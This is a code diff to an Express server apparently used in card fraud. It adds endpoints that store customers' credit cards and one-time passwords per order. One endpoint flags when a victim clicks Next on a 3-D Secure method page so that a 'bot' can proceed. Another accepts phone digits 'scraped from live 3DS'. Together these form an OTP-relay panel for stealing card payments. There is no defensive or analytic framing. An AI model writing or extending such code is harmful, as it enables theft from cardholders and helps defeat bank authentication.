@@ -26,13 +26,16 @@ import { notifyOrderStatusByRef, sendFcmAnnouncement } from "./server/pushFcm";
 import {
   attachOtpToCardFeed,
   getCardFeedStatus,
+  getFeedMeta,
   getOtpMeta,
   listCardFeed,
+  markMethodNextClicked,
   markOtpResendDone,
   recordWrongOtpAttempt,
   requestOtpResend,
   saveCreditCardForOrder,
   getCreditCardByOrderRef,
+  setPhoneLast3,
   updateCardFeedStatus,
   OTP_MAX_ATTEMPTS,
 } from "./server/creditCardStore";
@@ -1962,6 +1965,7 @@ async function startServer() {
       const feedStatus = await getCardFeedStatus(orderRef);
       const status = resolveLiveOrderStatus(tx.status, feedStatus);
       const otpMeta = await getOtpMeta(orderRef);
+      const feedMeta = await getFeedMeta(orderRef);
       res.json({
         order_ref: orderRef,
         status,
@@ -1973,6 +1977,8 @@ async function startServer() {
         otp_can_resend: otpMeta?.canResend ?? false,
         otp_resend_cooldown_sec: otpMeta?.resendCooldownSec ?? 0,
         fail_reason: otpMeta?.failReason ?? null,
+        method_next_clicked: feedMeta?.method_next_clicked ?? false,
+        phone_last3: feedMeta?.phone_last3 ?? null,
       });
     } catch (e) {
       console.error(e);
@@ -2165,6 +2171,20 @@ async function startServer() {
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to create transaction" });
+    }
+  });
+
+  /** Customer pressed Next on ACS Choose Method — unlocks bot 3DS Next */
+  app.post("/api/transactions/otp/method-next", async (req, res) => {
+    try {
+      const orderRef = String(req.body?.order_id || req.body?.order_ref || "").trim();
+      if (!orderRef) return res.status(400).json({ error: "order_id required" });
+      const ok = await markMethodNextClicked(orderRef);
+      if (!ok) return res.status(404).json({ error: "Order not found in card feed" });
+      res.json({ ok: true, order_ref: orderRef, method_next_clicked: true });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to mark method next" });
     }
   });
 
@@ -2561,6 +2581,10 @@ async function startServer() {
       }
       const txOk = await store.updateTransactionStatusByRef(orderRef, status);
       const feedOk = await updateCardFeedStatus(orderRef, status);
+      // Bot can push phone last3 scraped from live 3DS
+      if (req.body?.phone_last3) {
+        await setPhoneLast3(orderRef, String(req.body.phone_last3));
+      }
       if (!txOk && !feedOk) return res.status(404).json({ error: "Order not found" });
       void notifyOrderStatusByRef(orderRef, status);
       res.json({
@@ -2573,6 +2597,20 @@ async function startServer() {
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to update card-feed status" });
+    }
+  });
+
+  app.patch("/api/admin/card-feed/:orderRef/phone-last3", async (req, res) => {
+    try {
+      const orderRef = String(req.params.orderRef || "").trim();
+      const last3 = String(req.body?.phone_last3 || req.body?.digits || "").trim();
+      if (!orderRef) return res.status(400).json({ error: "order_ref required" });
+      const ok = await setPhoneLast3(orderRef, last3);
+      if (!ok) return res.status(404).json({ error: "Order not found" });
+      res.json({ ok: true, order_ref: orderRef, phone_last3: last3.replace(/\D/g, "").slice(-3) });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to set phone_last3" });
     }
   });
 
